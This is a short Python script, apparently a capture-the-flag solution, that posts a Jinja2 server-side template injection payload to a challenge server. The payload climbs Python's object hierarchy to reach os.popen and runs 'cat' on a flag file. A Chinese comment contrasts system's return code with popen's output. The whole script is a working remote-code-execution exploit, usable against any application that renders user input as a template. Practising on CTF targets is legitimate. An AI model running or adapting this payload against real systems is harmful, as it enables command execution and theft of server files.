# 知識點，system回傳狀態碼，popen回傳cmd
import requests
print(''.__class__.__mro__[1])


for i in range(132, 133):
    s = "{{().__class__.__base__.__subclasses__()["+str(
        i)+"].__init__.__globals__['popen']('cat /th1s_15_fl4ggggggg').read() }}"


    d = {'name': s}
    r = requests.post("http://h4ck3r.quest:8700/", data=d)
    print(str(i)+":"+str(r.content))




